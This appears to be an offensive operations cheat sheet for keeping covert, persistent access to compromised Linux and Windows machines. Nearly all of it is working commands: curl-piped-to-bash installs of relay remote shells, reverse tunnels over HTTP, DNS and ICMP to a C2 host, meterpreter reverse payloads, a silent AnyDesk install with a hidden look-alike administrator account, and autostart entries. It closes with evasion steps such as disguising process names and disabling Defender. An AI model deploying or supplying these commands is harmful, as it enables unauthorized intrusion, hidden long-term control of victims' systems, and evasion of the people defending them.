# Persistence & Reverse Connect Toolkit

## Overview
Comprehensive toolkit for maintaining persistent covert access using multiple transport protocols and tools. Always deploy multiple persistence methods - if one fails, others maintain access.

## Persistence Hierarchy (deploy in order)

### Tier 1: Covert Encrypted Tunnels (primary)
No open ports, relay-based, E2E encrypted.

**QSocket:**
```bash
S="SECRET" curl -fsSL qsocket.io/0 | bash          # deploy
qs-netcat -i -s "SECRET"                              # connect
```

**GS-NetCat (gsocket):**
```bash
bash -c "$(curl -fsSL gsocket.io/x)"                 # deploy
gs-netcat -i -s "SECRET"                              # connect
```

### Tier 2: HTTP/WebSocket Tunnels (firewall evasion)
Looks like normal web traffic.

**Chisel:**
```bash
# Server (on C2)
chisel server --reverse --port 8443 --auth user:pass
# Client (on target)
chisel client --auth user:pass C2_IP:8443 R:socks
```

**FRP (Fast Reverse Proxy):**
```ini
# frps.ini (C2 server)
[common]
bind_port = 7000
token = SECRET

# frpc.ini (target client)
[common]
server_addr = C2_IP
server_port = 7000
token = SECRET
[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000
```

**revsocks:**
```bash
# C2 side
revsocks -listen :8443 -socks 127.0.0.1:1080 -pass SECRET
# Target side
revsocks -connect C2_IP:8443 -pass SECRET
```

**rsockstun:**
```bash
# C2 side
rsockstun -listen :8443 -pass SECRET
# Target side
rsockstun -connect C2_IP:8443 -pass SECRET
```

**SSF (Secure Socket Funneling):**
```bash
# Multi-protocol: TCP, UDP, SOCKS, port forwarding
ssfd -p 8443                                          # server
ssf -D 9090 -p 8443 C2_IP                            # client SOCKS
ssf -L 2222:target:22 -p 8443 C2_IP                  # port forward
```

### Tier 3: Protocol Tunnels (deep evasion)
When only specific protocols are allowed.

**Iodine (DNS tunnel):**
```bash
# C2 (requires DNS delegation to your NS)
iodined -f -c -P SECRET 10.0.0.1 tunnel.yourdomain.com
# Target
iodine -f -P SECRET tunnel.yourdomain.com
# Then route traffic through 10.0.0.x tunnel
```

**Hans (ICMP tunnel):**
```bash
# C2
hans -s 10.0.0.1 -p SECRET
# Target
hans -c C2_IP -p SECRET
# Creates tun0 interface at 10.0.0.x
```

### Tier 4: Remote Desktop Persistence (GUI access)
Uses vendor relay infrastructure.

**AnyDesk (silent, hidden user):**
```powershell
mkdir "C:\ProgramData\Any Desk"
Invoke-WebRequest -Uri "http://download.anydesk.com/AnyDesk.exe" -OutFile "C:\ProgramData\AnyDesk.exe"
cmd.exe /c "C:\ProgramData\AnyDesk.exe" --install "C:\ProgramData\Any Desk" --start-with-win --silent
cmd.exe /c echo PASSWORD | C:\ProgramData\anydesk.exe --set-password
net user adminlstrator "PASSWORD" /add
net localgroup Administrators adminlstrator /ADD
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v adminlstrator /t REG_DWORD /d 0 /f
cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
```

**UltraVNC via tunnel:**
```bash
# Upload files
lput ultravnc.ini winvnc.exe PsExec64.exe ddengine64.dll -> c:\windows\
# Open firewall
netsh advfirewall firewall add rule name="svc" dir=in action=allow protocol=TCP localport=43211
# Install and start
.\PSexec64 -accepteula -nobanner -h c:\windows\winvnc.exe -install
.\PSexec64 -accepteula -nobanner -s -h c:\windows\winvnc.exe -startservice
.\PSexec64 -accepteula -nobanner -h -i 1 c:\windows\winvnc.exe
# Connect through proxy
proxychains3 vncviewer TARGET:43211
```

### Tier 5: Metasploit (full framework)
```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=C2 LPORT=443 -f exe > payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=C2 LPORT=4444 -f elf > payload.elf

# Handler
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 0.0.0.0; set LPORT 443; run -j"

# Persistence via meterpreter
run persistence -U -i 30 -p 4444 -r C2_IP
```

## Linux Persistence Methods

### systemd service
```bash
cat > /etc/systemd/system/svc.service << EOF
[Unit]
Description=System Service
After=network-online.target
[Service]
Type=simple
Restart=always
RestartSec=10
ExecStart=/usr/local/bin/TOOL ARGS
[Install]
WantedBy=multi-user.target
EOF
systemctl enable --now svc.service
```

### cron
```bash
(crontab -l; echo '*/5 * * * * pgrep TOOL || /path/to/TOOL ARGS &') | crontab -
```

### .bashrc
```bash
echo 'pgrep TOOL || (TOOL ARGS &)' >> ~/.bashrc
```

### rc.local
```bash
echo '/path/to/TOOL ARGS &' >> /etc/rc.local
```

## Windows Persistence Methods

### Registry Run key
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SvcName" /t REG_SZ /d "PATH ARGS" /f
```

### Scheduled Task
```cmd
schtasks /create /tn "SystemUpdate" /tr "PATH ARGS" /sc onlogon /ru SYSTEM
```

### Service
```cmd
sc create SvcName binPath= "PATH ARGS" start= auto
sc start SvcName
```

## Decision Matrix

| Scenario | Primary | Fallback | Deep Fallback |
|----------|---------|----------|---------------|
| Full outbound | qsocket/gsocket | chisel/frp | SSH reverse |
| HTTP only | chisel | frp | revsocks |
| DNS only | iodine | dnscat2 | - |
| ICMP only | hans | icmpsh | - |
| No outbound | AnyDesk (vendor relay) | VNC + qsocket | Physical |
| Windows domain | AnyDesk + RDP-PTH | Metasploit | atexec persistence |
| Linux server | qsocket + systemd | SSH keys + cron | crontab + .bashrc |

## OPSEC Checklist
- [ ] Disguise process names (`exec -a rsyslogd`)
- [ ] Use env vars for secrets (no cmdline trace)
- [ ] Patch timestamps on scheduled tasks (atexec)
- [ ] Hide users from login screen
- [ ] Disable Defender before loading tools
- [ ] Multiple persistence at different tiers
- [ ] Test connectivity before leaving target
